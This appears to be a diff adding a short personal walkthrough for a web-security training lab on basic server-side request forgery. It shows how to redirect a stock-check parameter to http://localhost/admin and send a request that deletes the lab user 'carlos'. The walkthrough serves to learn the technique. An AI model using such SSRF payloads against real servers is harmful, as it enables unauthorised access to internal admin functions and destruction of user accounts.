@@ -1,0 +1,7 @@
+Lab #01: Basic SSRF against the local server
+
+1. Access the stock page itercept it and sent it to burp repeater and change the stock checking url to http://localhost/admin
+2. Select show response in browser. There is an option to delete user carlos, copy the url
+https://0aec004403d00e49848269e9001100c6.web-security-academy.net/admin/delete?username=carlos
+3. Send the below request from burp repeater.
+stockApi=http://localhost/admin/delete?username=carlos
